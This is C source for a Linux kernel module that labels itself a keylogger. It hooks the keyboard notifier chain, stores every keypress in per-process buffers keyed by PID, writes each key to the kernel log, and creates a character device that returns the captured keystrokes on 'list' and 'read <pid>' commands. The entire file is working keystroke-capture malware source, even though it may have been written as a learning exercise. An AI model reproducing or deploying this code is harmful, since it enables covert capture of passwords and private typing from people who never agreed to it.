#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/ioctl.h>
#include <linux/sched.h>
#include <linux/hashtable.h>

#define DEVICE_NAME "keylogger"
#define BUFFER_SIZE 1024
#define CLASS_NAME "keylogger_class"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Keylogger module");

static int major;
int requested_pid;

static struct class *keylogger_device_class;
static struct device *keylogger_device;
static struct notifier_block nb;

struct process_buffer {
    pid_t pid;
    char key_buffer[BUFFER_SIZE];
    char proc_name[TASK_COMM_LEN];
    size_t key_buffer_pos;
    struct hlist_node node;
};

DEFINE_HASHTABLE(process_table, 8);

struct process_buffer *find_or_create_process_buffer(pid_t pid) {
    struct process_buffer *entry;

    hash_for_each_possible(process_table, entry, node, pid) {
        if (entry->pid == pid)
            return entry;
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return NULL;

    entry->pid = pid;
    entry->key_buffer_pos = 0;
    get_task_comm(entry->proc_name, current);
    memset(entry->key_buffer, 0, BUFFER_SIZE);

    hash_add(process_table, &entry->node, pid);

    return entry;
}

static void cleanup_process_buffers(void) {
    struct process_buffer *entry;
    struct hlist_node *tmp;
    int bkt;

    hash_for_each_safe(process_table, bkt, tmp, entry, node) {
        hash_del(&entry->node);
        kfree(entry);
    }
}

static int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {
        pid_t pid = current->pid;
        struct process_buffer *proc_buf = find_or_create_process_buffer(pid);

        if (proc_buf && proc_buf->key_buffer_pos < BUFFER_SIZE - 1) {
            proc_buf->key_buffer[proc_buf->key_buffer_pos++] = param->value;
            proc_buf->key_buffer[proc_buf->key_buffer_pos] = '\0';

            printk("keylogger_module: getting input from %d, key: %c\n", pid, proc_buf->key_buffer[proc_buf->key_buffer_pos - 1]);

        }
    }
    return NOTIFY_OK;
}

void print_all_pids(void) {
    struct process_buffer *entry;
    int bkt;

    printk(KERN_INFO "keylogger_module: Listing all PIDs in hash table\n");

    hash_for_each(process_table, bkt, entry, node) {
        printk(KERN_INFO "keylogger_module: PID: %d, process name: %s\n", entry->pid, entry->proc_name);
    }
}

int get_buffer_by_pid(pid_t pid) {
    struct process_buffer *entry;
    struct hlist_node *tmp;
    size_t buffer_size;

    hash_for_each_possible(process_table, entry, node, pid) {
        if (entry->pid == pid) {
            printk(KERN_INFO "Buffer for pid %d: %s\n", pid, entry->key_buffer);
            return 0;
        }
    }

    return -1;
}

long extract_pid_from_string(char *str) {
    char *token;
    long pid = -1;

    token = strsep(&str, " ");
    if (token) {
        printk("%s\n", token);
        token = strsep(&str, " ");
        if (token) {
            printk("%s\n", token);
            kstrtol(token, 10, &pid);
        }
    }

    return pid;
}

static ssize_t device_write(struct file *file, const char __user *buf, size_t count, loff_t *offset)
{
    char kernel_buffer[128];
    size_t buffer_size;

    buffer_size = min(count, sizeof(kernel_buffer) - 1);

    int res = copy_from_user(kernel_buffer, buf, buffer_size);

    kernel_buffer[buffer_size] = '\0';

    if (strncmp(kernel_buffer, "list", 4) == 0) {
        printk("keylogger_module: List command called\n");
        print_all_pids();
    }

    if (strncmp(kernel_buffer, "read", 4) == 0) {
        printk("keylogger_module: Read command called\n");
        requested_pid = extract_pid_from_string(kernel_buffer);
        printk("keylogger_module: requested pid is %d\n", requested_pid);
        get_buffer_by_pid(requested_pid);
    }

    printk("keylogger_module: Device write %ld bytes\n", count);

    return buffer_size;
}

static struct file_operations fops = {
    .write = device_write
};

static int __init my_init(void)
{
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) {
        printk("keylogger_module: Error registering chrdev\n");
        return major;
    }

    keylogger_device_class = class_create(CLASS_NAME);

    if (IS_ERR(keylogger_device_class)) {
        printk("keylogger_module: Failed creating device class\n");
        return 1;
    }

    keylogger_device = device_create(keylogger_device_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);

    if (IS_ERR(keylogger_device)) {
        printk("keylogger_module: Failed creating device\n");
        return 1;
    }

    printk("keylogger_module: Major device number is %d\n", major);
    printk("keylogger_module: Created device %s\n", DEVICE_NAME);

    nb.notifier_call = keyboard_notifier_callback;
    if (register_keyboard_notifier(&nb)) {
        printk("keylogger_module: Failed registering keyboard notifier\n");
        return -1;
    }

    return 0;
}

static void __exit my_exit(void) {
    unregister_keyboard_notifier(&nb);
    cleanup_process_buffers();
    device_destroy(keylogger_device_class, MKDEV(major, 0));
    printk("keylogger_module: Destroyed %s device\n", DEVICE_NAME);

    class_unregister(keylogger_device_class);
    class_destroy(keylogger_device_class);
    printk("keylogger_module: Destroyed %s class\n", CLASS_NAME);

    unregister_chrdev(major, DEVICE_NAME);
    printk("keylogger_module: Unregistered chrdev\n");
}

module_init(my_init);
module_exit(my_exit);
